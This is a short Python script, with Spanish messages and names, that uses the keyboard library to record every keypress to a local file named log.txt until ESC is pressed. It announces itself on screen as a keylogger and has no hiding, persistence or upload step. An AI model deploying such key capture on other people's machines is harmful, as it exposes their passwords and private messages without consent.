import keyboard

archivo_log = "log.txt"

print("  Keylogger Iniciado ")

print("Para salir, presiona la tecla: ESC")

def capturar_tecla(evento):

    with open(archivo_log, "a", encoding="utf-8") as f:

        if evento.name == "space":
            f.write(" ")
        elif len(evento.name) > 1:
            f.write(f" [{evento.name.upper()}]")
        else:
            f.write(evento.name)

keyboard.on_press(capturar_tecla)

keyboard.wait ("esc")

print("\n Keylogger detenido")